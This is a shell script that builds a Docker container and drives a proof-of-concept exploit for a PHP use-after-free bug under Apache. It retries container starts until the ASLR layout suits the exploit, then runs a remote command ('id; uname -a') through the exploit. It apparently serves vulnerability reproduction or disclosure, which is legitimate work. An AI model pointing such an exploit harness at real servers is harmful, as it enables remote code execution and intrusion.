#!/bin/sh
set -eu
cd "$(dirname "$0")"
IMAGE=php-uaf-apache-repro:8.5.4
NAME=php-uaf-apache-repro
docker build -t "$IMAGE" .
docker rm -f "$NAME" >/dev/null 2>&1 || true
docker run -d --name "$NAME" --cap-add SYS_PTRACE -p 127.0.0.1:18086:80 "$IMAGE" >/dev/null
for attempt in $(seq 1 20); do
  [ "$attempt" -eq 1 ] || { docker restart "$NAME" >/dev/null; sleep 0.4; }
  for i in $(seq 1 100); do
    curl -fsS http://127.0.0.1:18086/index.php >/dev/null 2>&1 && break
    sleep 0.05
  done
  set +e
  ARGS=$(docker exec "$NAME" /poc/discover.py 2>/tmp/php-uaf-discover.err)
  code=$?
  set -e
  [ "$code" -eq 0 ] && break
  [ "$code" -eq 75 ] || { cat /tmp/php-uaf-discover.err >&2; exit "$code"; }
done
[ -n "${ARGS:-}" ] || { echo 'No suitable ASLR layout in 20 starts' >&2; exit 1; }
docker exec "$NAME" rm -f /tmp/apache-docker-poc-output
# shellcheck disable=SC2086
python3 ../apache_poc.py --host 127.0.0.1 --port 18086 --path /index.php \
  $ARGS --seed-url /seed.php --command 'id; uname -a' \
  --output /tmp/apache-docker-poc-output
printf '\n=== command output inside Apache container ===\n'
docker exec "$NAME" cat /tmp/apache-docker-poc-output
